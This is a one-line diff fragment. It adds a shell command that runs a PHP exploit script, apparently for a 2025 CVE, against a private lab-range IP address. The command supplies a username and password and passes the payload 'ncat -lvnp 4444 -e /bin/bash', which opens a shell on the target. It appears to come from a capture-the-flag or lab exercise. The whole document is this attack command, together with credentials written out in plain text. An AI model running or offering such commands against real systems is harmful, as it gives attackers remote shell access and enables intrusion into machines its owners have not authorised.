@@ -1,0 +1,1 @@
+php cve2025.php http://10.129.242.55/ tyler LhKL1o9Nm3X2 "ncat -lvnp 4444 -e /bin/bash"
